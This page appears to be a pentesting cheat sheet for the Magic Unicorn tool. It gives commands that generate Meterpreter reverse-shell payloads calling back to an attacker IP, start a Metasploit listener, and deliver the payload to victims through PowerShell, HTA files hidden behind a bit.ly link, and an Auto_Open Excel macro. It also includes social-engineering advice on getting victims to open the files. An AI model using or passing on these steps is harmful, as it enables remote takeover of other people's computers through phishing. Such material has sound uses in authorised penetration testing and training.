# ⭕ Magic Unicorn

{% embed url="https://github.com/trustedsec/unicorn" %}

Magic Unicorn is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory. Based on Matthew Graeber's powershell attacks and the powershell bypass technique presented by David Kennedy (TrustedSec) and Josh Kelly at Defcon 18.

```
git clone https://github.com/trustedsec/unicorn.git

./unicorn.py
```

### <mark style="color:orange;">**Powershell Attack**</mark>

```
./unicorn.py windows/meterpreter/reverse_tcp 192.168.1.109 4444
```

Now this will give us two files. One is a text file named “powershell\_attack.txt” which has the PowerShell code that will be run in the victim’s machine using social engineering and the other is “unicorn.rc” which is a custom Metasploit file that will automatically set all the parameters and start a listener.

```
msfconsole -r unicorn.rc

# or if msf is already running :
msf> resource unicorn.rc
```

deliver the payload from powershell\_attack.txt file to the victim (via CMD or somewhere else) and you have a shell.

### <mark style="color:orange;">**HTA Attack**</mark>

```
./unicorn.py windows/meterpreter/reverse_https 192.168.1.109 4455 hta
```

Now convert your IP in bit.ly URL form and send to the victim and then wait for the user to click on the “launcher.hta” file which could be done using social engineering easily.

{% hint style="info" %}
The victim has to open the link to your hosted index.html file and click "open" when prompt for the HTA file to run.
{% endhint %}

### <mark style="color:orange;">**Macro Attack**</mark>

```
./unicorn.py windows/meterpreter/reverse_https 192.168.1.109 443 macro
```

This again creates a text file and a “**.rc**” file with the same name and on the same destination.

To enable developer mode there are various methods depending upon your version of MS office.

As for a generic approach, let’s say you enabled it like:

**File->properties->ribbons->developer mode**

![](<../../.gitbook/assets/image (296).png>)

You will see an extra tab labeled developer once it gets enabled.

As for the attack, go to developer->macros and create a new macro named “Auto\_Open”

![](<../../.gitbook/assets/image (295).png>)

Simply paste the contents from “powershell\_attack.txt” to this xlsx module and save it.

![](<../../.gitbook/assets/image (298).png>)

As soon as you click run (little green icon on the top), it will give you an error! Don’t worry! You want that error. It is supposed to happen.
